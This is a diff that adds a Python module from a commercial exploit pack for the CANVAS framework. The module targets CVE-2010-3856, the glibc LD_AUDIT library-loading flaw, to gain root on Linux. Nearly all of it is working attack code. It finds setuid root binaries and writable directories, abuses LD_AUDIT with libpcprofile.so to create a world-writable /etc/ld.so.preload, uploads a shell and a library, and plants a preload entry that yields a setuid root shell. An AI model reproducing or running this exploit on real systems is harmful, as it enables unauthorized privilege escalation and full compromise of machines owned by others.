@@ -1,0 +1,201 @@
+#! /usr/bin/env python
+# -*- coding: utf-8 -*-
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2010
+#
+
+import sys, os
+from ExploitTypes.localexploit import LocalExploit
+
+# GUI info
+NAME = "D2SEC CVE_2010_3856"
+DESCRIPTION = "GNU C library dynamic linker LD_AUDIT arbitrary DSO load vulnerability" 
+VERSION="1.0"
+
+DOCUMENTATION = {}
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION['Date public'] = "2010/10/22"
+DOCUMENTATION['References'] = "http://www.exploit-db.com/exploits/15304/"
+DOCUMENTATION['Versions Affected'] = "Glibc version > 2.4"
+DOCUMENTATION["CVE Name"] = "CVE-2010-3856"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3856"
+
+DOCUMENTATION["Notes"] = ""
+
+PROPERTY={}
+PROPERTY['TYPE'] = 'Exploit'
+PROPERTY['SITE'] = 'Local'
+PROPERTY['ARCH'] = [["Linux"]]
+
+class theexploit(LocalExploit):
+  def __init__(self):
+    LocalExploit.__init__(self)
+    self.name = NAME
+    self.wxdir = ''
+    self.suid = ''
+    
+  # Modified function from CVE_2010_3847 exploit module
+  def find_setuid_files(self, node):
+    S_ISUID = node.shell.libc.getdefine('S_ISUID')
+    R_OK = node.shell.libc.getdefine('R_OK')
+    suids = [ "/bin/ping", "/bin/ping6", "/bin/umount", "/bin/su",
+      "/bin/mount", "/sbin/unix_chkpwd", "/usr/bin/chfn",
+      "/usr/bin/chsh", "/usr/bin/crontab", "/usr/bin/passwd",
+      "/usr/bin/rcp", "/usr/bin/rlogin", "/usr/bin/sudo",
+      "/usr/sbin/mtr", "/usr/sbin/suexec", "/usr/sbin/seunshare" ]
+
+    # Find all setuid root executables
+    for suid in suids:
+      (ret, stat) = node.shell.stat(suid)
+      if ret < 0 or not stat["st_mode"] & S_ISUID or stat["st_uid"] != 0:
+        continue;
+      if node.shell.access(suid, R_OK):
+        self.suid = suid
+        break
+
+  # Function from CVE_2010_3847 exploit module
+  def find_wx_dir(self, node):
+    # First pass, just have some hardcoded directories we check.
+    dirs = [ '/dev/shm', '/var/tmp', '/usr/tmp', '/tmp' ]
+    dir = self.test_wx_dirs(node, dirs)
+    if dir:
+      return dir
+    # Now try if we have a home directory, and if so scan from there.
+    dir = self.get_home_dir(node)
+    if dir:
+      self.log('[D2] Scanning home directory for wx directories.')
+      dir = self.test_dirs(node, dir, dirs, 1)
+      if dir:
+        return dir
+    return ''
+  
+  # Function from CVE_2010_3847 exploit module
+  def test_wx_dirs(self, node, dirs):
+    X_OK = node.shell.libc.getdefine('X_OK')
+    W_OK = node.shell.libc.getdefine('W_OK')
+    for dir in dirs:
+      # If this directory is not on the same filesystem as the
+      # setuid binary, we cannot use it, as we need to hardlink.
+      (ret, stat) = node.shell.stat(dir)
+      if ret < 0:
+        continue
+      # If we cannot execute or write to the dir, skip it
+      if not node.shell.access(dir, W_OK | X_OK):
+        continue
+      # XXX: if statvfs() fails we may want to do better.
+      try:
+        vstat = node.shell.statvfs(dir)
+      except:
+        continue
+      # We don't want NOEXEC directories.
+      if vstat["f_flag"] & node.shell.ST_NOEXEC:
+        continue
+      # Nor do we want NOSUID directories.
+      if vstat["f_flag"] & node.shell.ST_NOSUID:
+        continue
+      return dir
+    return ''
+
+  def __name(self, base, file):
+    if base[-1] != '/':
+      return base + '/' + file
+    else:
+      return base + file
+
+  # Function from CVE_2010_3847 exploit module
+  def test_dirs(self, node, root, exclude = [], depth = 2):
+    S_IFDIR = node.shell.libc.getdefine('S_IFDIR')
+    dirs = [root]
+    for i in xrange(0, depth):
+      for dir in dirs:
+        exclude.append(self.__name(dir, '.'))
+        exclude.append(self.__name(dir, '..'))
+        dirs = dirs + [ self.__name(dir, d[0]) for d in node.shell.dodir(dir)
+              if self.__name(dir, d[0]) not in exclude and d[1]["st_mode"] & S_IFDIR ]
+      exclude = exclude + dirs
+    # See if any of these directories works.
+    dir = self.test_wx_dirs(node, dirs)
+    if dir:
+      return dir
+    return ''
+
+  # Function from CVE_2010_3847 exploit module
+  def get_home_dir(self, node):
+    # Next up is our home directory, assuming we can manage to determine
+    # what it is in the first place.
+    uid = node.shell.getuid()
+    self.log('[D2] Trying to determine home directory for uid %d...' % uid)
+    # XXX: yes, we do this the ugly way.  Implementing this in MOSDEF-libc
+    # means we would have to emulate the glibc NSS layer in order to have
+    # NIS and so on.  We might want to avoid this :-)
+    pwdent = node.shell.runcommand("/usr/bin/getent passwd %d" % uid)
+    pwdent = pwdent.split(':')
+    # XXX: sanity check, we want to make sure this is not the shell
+    # returning errors that getent was not found.
+    if len(pwdent) == 7 and int(pwdent[2]) == uid:
+      self.log('[D2] Found home directory: %s' % pwdent[-2])
+      return pwdent[-2]
+    else:
+      self.log('[D2] Failed to determine home directory')
+      return ''
+
+  def get_suid_shell(self, node):
+    self.log('[D2] Cataloging setuid root files on system.')
+    self.find_setuid_files(node)
+    if not self.suid:
+      self.log('[D2] Failed to find a setuid root file.')
+      return False
+    self.log('[D2] Scanning for writable/executable directory')
+    self.wxdir = self.find_wx_dir(node)
+    if not self.wxdir:
+      self.log('[D2] Failed to find a writeable/executable directory')
+      return False
+    self.log('[D2] Found usable directory %s with suid %s' % (self.wxdir, self.suid))
+
+    ldpreload = '/etc/ld.so.preload'
+    node.shell.runcommand("umask 0; LD_AUDIT=\"libpcprofile.so\" PCPROFILE_OUTPUT=\"%s\" %s 2> /dev/null" % (ldpreload, self.suid))
+    (ret, stat) = node.shell.stat('%s' % ldpreload)
+    if ret < 0:
+      self.log('[D2] File %s not created')
+      return False
+    perms = '%o' % stat['st_mode']
+    if perms != '100666':
+      self.log('[D2] Created file %s with mode <> 0666' % ldpreload)
+      return False
+    self.log('[D2] Created file %s with mode 0666 !' % ldpreload)
+    node.shell.runcommand("echo -n > %s" % ldpreload)
+  
+    if node.shell.chdir(self.wxdir) < 0:
+      self.log('[D2] Failed to chdir() to %s' % self.wxdir)
+      return False
+    files_to_upload = ['d2sec_shell', 'd2sec_lib.so']
+    for file_to_upload in files_to_upload:
+      r = node.upload(os.path.join(os.getcwd(), '3rdparty/D2SEC/exploits/d2sec_cve_2010_3856/Resources/%s' % file_to_upload), 
+        destfilename = os.path.join(self.wxdir, file_to_upload))
+      if r == 0:
+        self.log('[D2] Upload of %s failed' % file_to_upload)
+        return False
+
+    node.shell.runcommand('echo %s > %s' % (os.path.join(self.wxdir, 'd2sec_lib.so'), ldpreload))
+    node.shell.runcommand('%s 2> /dev/null' % self.suid)
+    self.log('[D2] Run %s to get a suid root shell (using shellshock for example)' % os.path.join(self.wxdir, 'd2sec_shell'))
+    
+  def run(self):
+    self.setInfo('[D2] %s - running' % NAME)
+    for node in self.argsDict["passednodes"]:
+      nodename = node.getname()
+      caps = node.capabilities
+      if "linux" not in caps:
+        self.log('[D2] Node %s not a Linux node...' % nodename)
+        continue
+      else:
+        self.get_suid_shell(node)
+    self.setInfo('[D2] %s - done' % NAME)
+    return 1
+
+if __name__ == "__main__":
+  print "This module is meant to be run only within CANVAS"
